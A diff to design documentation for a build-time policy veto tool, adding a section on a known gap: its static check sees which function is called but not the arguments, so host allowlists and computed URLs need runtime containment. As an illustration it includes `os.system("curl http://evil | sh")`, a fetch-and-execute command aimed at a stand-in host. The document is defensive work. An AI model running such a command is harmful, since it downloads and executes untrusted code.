@@ -266,6 +266,33 @@ $ echo $?
 1                                   # → lib/veto: VETO (veto:no-ast)
 ```
 
+#### Known gap: 2b reads the *call*, not its *arguments* (yet)
+
+The emit carries the resolved `callee` but **not the call's arguments**.
+`http.get("http://1.2.3.4/x")` surfaces `callee: "http_get"` with **no URL**;
+`os.system("curl http://evil | sh")` surfaces `callee: "os_system"` with **no
+command string**. Two consequences:
+
+- 2b can say *"this build reaches the network / shells out"* but **not** *"…to
+  *this host*."* A **host allowlist** (`deny net except mirror.corp`) is
+  therefore not yet expressible in 2b — it's all-or-nothing on the category.
+- It also exposes why **origin scoping is load-bearing**: a single user
+  `http.get(...)` explodes into ~10 std-origin nodes from inside
+  `std/http/module.ae` (`http_get_raw` — the actual socket — `http_response_*`,
+  `string_concat`, …). All of those are `--lib`-origin and **exempt**; only the
+  user-file `http_get` node trips a `net` rule. Without origin scoping every
+  `http.get` would drag the stdlib's internals into the verdict.
+
+Filed upstream: `../aether/veto-emit-ast-args.md` asks for **literal arguments**
+on `function_call` nodes (plus a one-level *provenance* shape for computed args,
+and emitting after const-fold). The discipline that keeps it safe: aeb **never
+allows on a partial/computed argument** — a literal URL is allowlist-checked
+statically; a *computed* URL (`http.get(base + path)`) is **fail-closed
+vetoed**, with the provenance used only to write a precise message. The actual
+host of a computed reach is **layer 3's** job — the `connect()` interceptor sees
+the resolved address regardless of how the URL was built. So: 2b reads literal
+targets pre-build; layer 3 backstops the computed ones at the syscall.
+
 ### Layer 3 — runtime containment (the part the source set can't override)
 
 Covered in depth in "Veto is policy; containment is enforcement" below. The
